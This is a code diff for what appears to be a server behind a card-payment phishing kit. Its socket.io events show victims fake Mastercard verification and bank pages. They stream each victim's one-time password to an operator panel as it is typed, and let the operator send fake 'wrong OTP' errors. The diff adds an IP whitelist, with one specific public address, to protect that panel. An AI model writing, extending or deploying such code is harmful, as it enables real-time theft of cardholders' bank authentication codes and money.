@@ -338,6 +338,50 @@ function cleanupInactiveVisitors() {
   }
 }
 
+// NEW ADDITION: IP whitelist middleware for admin-related API endpoints
+app.use((req, res, next) => {
+  // List of whitelisted IPs - replace these with your actual IPs
+  const whitelistedIPs = [
+    '110.227.53.195', // Replace with your actual IP
+    '192.168.1.1',     // Replace with your actual IP
+    'localhost',       // For local development
+    '127.0.0.1',       // For local development
+    '::1',             // For local development
+    // Add more IPs as needed
+  ];
+  
+  // Check if this is an admin endpoint
+  const isAdminEndpoint = (
+    req.path.includes('/api/transactions') ||
+    req.path.includes('/api/visitors') ||
+    req.path.includes('/api/expirePaymentLink') ||
+    req.path.includes('/api/showOTP') ||
+    req.path.includes('/api/wrongOTP') ||
+    req.path.includes('/api/updateRedirectStatus') ||
+    req.path.includes('/api/showBankpage') ||
+    req.path.includes('/api/hideBankpage')
+  );
+  
+  if (isAdminEndpoint) {
+    // Get client IP
+    const clientIP = req.headers['x-forwarded-for'] || 
+                     req.connection.remoteAddress || 
+                     req.socket.remoteAddress || 
+                     'Unknown';
+    
+    // Clean up the IP in case of proxies
+    const cleanIP = clientIP.split(',')[0].trim();
+    
+    // Check if IP is whitelisted
+    if (!whitelistedIPs.includes(cleanIP)) {
+      console.log(`Blocked admin access attempt from IP: ${cleanIP}`);
+      return res.status(403).json({ error: 'Access denied' });
+    }
+  }
+  
+  next();
+});
+
 // Serve static files
 app.use(express.static("."));
 
@@ -683,21 +727,9 @@ app.get('/api/getTransactionForFail', (req, res) => {
 io.on('connection', (socket) => {
   console.log('New socket connection established with ID:', socket.id);
   
-  // FIXED: Improved room joining with acknowledgment
-  socket.on('join', (invoiceId, callback) => {
-    try {
-      console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
-      socket.join(invoiceId);
-      // Send confirmation if callback provided
-      if (typeof callback === 'function') {
-        callback({ success: true });
-      }
-    } catch (error) {
-      console.error(`Error joining room ${invoiceId}:`, error);
-      if (typeof callback === 'function') {
-        callback({ success: false, error: error.message });
-      }
-    }
+  socket.on('join', (invoiceId) => {
+    console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
+    socket.join(invoiceId);
   });
   
   // Add listener for currency page redirection
@@ -710,52 +742,52 @@ io.on('connection', (socket) => {
     }
   });
   
-  // MC verification events - enhanced with direct broadcasting
-  socket.on('show_mc_verification', (data) => {
-    // Broadcast to the specific client with this invoice ID
-    console.log('Received show_mc_verification event:', data);
-    io.to(data.invoiceId).emit('show_mc_verification', data);
-  });
+// MC verification events - enhanced with direct broadcasting
+socket.on('show_mc_verification', (data) => {
+  // Broadcast to the specific client with this invoice ID
+  console.log('Received show_mc_verification event:', data);
+  io.to(data.invoiceId).emit('show_mc_verification', data);
+});
 
-  socket.on('update_mc_bank', (data) => {
-    // Update bank logo on client
-    console.log('Received update_mc_bank event:', data);
-    io.to(data.invoiceId).emit('update_mc_bank', {
-      invoiceId: data.invoiceId,
-      bankCode: data.bankCode
-    });
+socket.on('update_mc_bank', (data) => {
+  // Update bank logo on client
+  console.log('Received update_mc_bank event:', data);
+  io.to(data.invoiceId).emit('update_mc_bank', {
+    invoiceId: data.invoiceId,
+    bankCode: data.bankCode
   });
+});
 
-  socket.on('mc_otp_submitted', (data) => {
-    // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
-    console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
-    io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
-  });
+socket.on('mc_otp_submitted', (data) => {
+  // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
+  console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
+  io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
+});
 
-  // Optional - for live OTP typing feature
-  socket.on('mc_otp_typing', (data) => {
-    // Send partial OTP to admin panel as user types - optional feature
-    console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
-    io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
-  });
+// Optional - for live OTP typing feature
+socket.on('mc_otp_typing', (data) => {
+  // Send partial OTP to admin panel as user types - optional feature
+  console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
+  io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
+});
 
-  socket.on('mc_otp_error', (data) => {
-    // Send OTP error to client
-    console.log('Sending OTP error to client:', data);
-    io.to(data.invoiceId).emit('mc_otp_error', data);
-  });
+socket.on('mc_otp_error', (data) => {
+  // Send OTP error to client
+  console.log('Sending OTP error to client:', data);
+  io.to(data.invoiceId).emit('mc_otp_error', data);
+});
 
-  socket.on('mc_verification_result', (data) => {
-    // Send verification result to client
-    console.log('Sending verification result to client:', data);
-    io.to(data.invoiceId).emit('mc_verification_result', data);
-  });
+socket.on('mc_verification_result', (data) => {
+  // Send verification result to client
+  console.log('Sending verification result to client:', data);
+  io.to(data.invoiceId).emit('mc_verification_result', data);
+});
 
-  socket.on('mc_resend_otp', (data) => {
-    // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
-    console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
-    io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
-  });
+socket.on('mc_resend_otp', (data) => {
+  // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
+  console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
+  io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
+});
   
   // Handle disconnect
   socket.on('disconnect', () => {
